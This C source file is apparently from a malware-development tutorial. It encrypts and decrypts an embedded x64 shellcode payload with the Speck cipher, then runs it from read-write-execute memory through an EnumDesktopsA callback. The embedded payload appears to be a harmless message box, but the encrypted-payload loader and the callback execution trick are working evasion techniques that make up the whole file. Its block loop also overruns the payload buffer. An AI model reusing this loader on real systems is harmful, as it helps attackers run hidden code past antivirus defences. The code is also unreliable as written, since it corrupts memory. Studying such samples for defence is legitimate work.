/*
* hack2.c
* encrypt/decrypt payload via Speck
* author: @cocomelonc
* https://cocomelonc.github.io/malware/2025/05/29/malware-cryptography-42.html
*/
#include <stdio.h>
#include <stdint.h>
#include <string.h>
#include <windows.h>

#define ROUNDS 27
#define BLOCK_SIZE 16

uint64_t key[2] = {0x1918111009080100, 0x1110980801000908};
uint64_t round_keys[ROUNDS];

uint64_t rol(uint64_t x, int r) {
  return (x << r) | (x >> (64 - r));
}

uint64_t ror(uint64_t x, int r) {
  return (x >> r) | (x << (64 - r));
}

void speck_key_schedule() {
  round_keys[0] = key[0];
  uint64_t b = key[1];
  for (int i = 0; i < ROUNDS - 1; i++) {
    b = (ror(b, 8) + round_keys[i]) ^ i;
    round_keys[i + 1] = rol(round_keys[i], 3) ^ b;
  }
}

void speck_encrypt(uint64_t* x, uint64_t* y) {
  for (int i = 0; i < ROUNDS; i++) {
    *x = (ror(*x, 8) + *y) ^ round_keys[i];
    *y = rol(*y, 3) ^ *x;
  }
}

void speck_decrypt(uint64_t* x, uint64_t* y) {
  for (int i = ROUNDS - 1; i >= 0; i--) {
    *y = ror(*y ^ *x, 3);
    *x = rol((*x ^ round_keys[i]) - *y, 8);
  }
}

int main() {
  unsigned char payload[] = {
    0xfc,0x48,0x81,0xe4,0xf0,0xff,0xff,0xff,0xe8,0xd0,0x00,0x00,0x00,0x41,0x51,0x41,
    0x50,0x52,0x51,0x56,0x48,0x31,0xd2,0x65,0x48,0x8b,0x52,0x60,0x3e,0x48,0x8b,0x52,
    0x18,0x3e,0x48,0x8b,0x52,0x20,0x3e,0x48,0x8b,0x72,0x50,0x3e,0x48,0x0f,0xb7,0x4a,
    0x4a,0x4d,0x31,0xc9,0x48,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0x41,0xc1,
    0xc9,0x0d,0x41,0x01,0xc1,0xe2,0xed,0x52,0x41,0x51,0x3e,0x48,0x8b,0x52,0x20,0x3e,
    0x8b,0x42,0x3c,0x48,0x01,0xd0,0x3e,0x8b,0x80,0x88,0x00,0x00,0x00,0x48,0x85,0xc0,
    0x74,0x6f,0x48,0x01,0xd0,0x50,0x3e,0x8b,0x48,0x18,0x3e,0x44,0x8b,0x40,0x20,0x49,
    0x01,0xd0,0xe3,0x5c,0x48,0xff,0xc9,0x3e,0x41,0x8b,0x34,0x88,0x48,0x01,0xd6,0x4d,
    0x31,0xc9,0x48,0x31,0xc0,0xac,0x41,0xc1,0xc9,0x0d,0x41,0x01,0xc1,0x38,0xe0,0x75,
    0xf1,0x3e,0x4c,0x03,0x4c,0x24,0x08,0x45,0x39,0xd1,0x75,0xd6,0x58,0x3e,0x44,0x8b,
    0x40,0x24,0x49,0x01,0xd0,0x66,0x3e,0x41,0x8b,0x0c,0x48,0x3e,0x44,0x8b,0x40,0x1c,
    0x49,0x01,0xd0,0x3e,0x41,0x8b,0x04,0x88,0x48,0x01,0xd0,0x41,0x58,0x41,0x58,0x5e,
    0x59,0x5a,0x41,0x58,0x41,0x59,0x41,0x5a,0x48,0x83,0xec,0x20,0x41,0x52,0xff,0xe0,
    0x58,0x41,0x59,0x5a,0x3e,0x48,0x8b,0x12,0xe9,0x49,0xff,0xff,0xff,0x5d,0x49,0xc7,
    0xc1,0x00,0x00,0x00,0x00,0x3e,0x48,0x8d,0x95,0x1a,0x01,0x00,0x00,0x3e,0x4c,0x8d,
    0x85,0x25,0x01,0x00,0x00,0x48,0x31,0xc9,0x41,0xba,0x45,0x83,0x56,0x07,0xff,0xd5,
    0xbb,0xe0,0x1d,0x2a,0x0a,0x41,0xba,0xa6,0x95,0xbd,0x9d,0xff,0xd5,0x48,0x83,0xc4,
    0x28,0x3c,0x06,0x7c,0x0a,0x80,0xfb,0xe0,0x75,0x05,0xbb,0x47,0x13,0x72,0x6f,0x6a,
    0x00,0x59,0x41,0x89,0xda,0xff,0xd5,0x4d,0x65,0x6f,0x77,0x2d,0x6d,0x65,0x6f,0x77,
    0x21,0x00,0x3d,0x5e,0x2e,0x2e,0x5e,0x3d,0x00
  };
  int payload_len = sizeof(payload);

  speck_key_schedule();

  for (int i = 0; i < payload_len; i += BLOCK_SIZE) {
    speck_encrypt((uint64_t*)&payload[i], (uint64_t*)&payload[i+8]);
  }

  printf("encrypted: \n");
  for (int i = 0; i < payload_len; i++) {
    printf("%02x ", payload[i]);
    if ((i + 1) % 16 == 0) printf("\n");
  }
  printf("\n\n");

  for (int i = 0; i < payload_len; i += BLOCK_SIZE) {
    speck_decrypt((uint64_t*)&payload[i], (uint64_t*)&payload[i+8]);
  }

  printf("decrypted: \n");
  for (int i = 0; i < payload_len; i++) {
    printf("%02x ", payload[i]);
    if ((i + 1) % 16 == 0) printf("\n");
  }

  LPVOID mem = VirtualAlloc(NULL, payload_len, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
  memcpy(mem, payload, payload_len);
  EnumDesktopsA(GetProcessWindowStation(), (DESKTOPENUMPROCA)mem, (LPARAM)NULL);

  return 0;
}
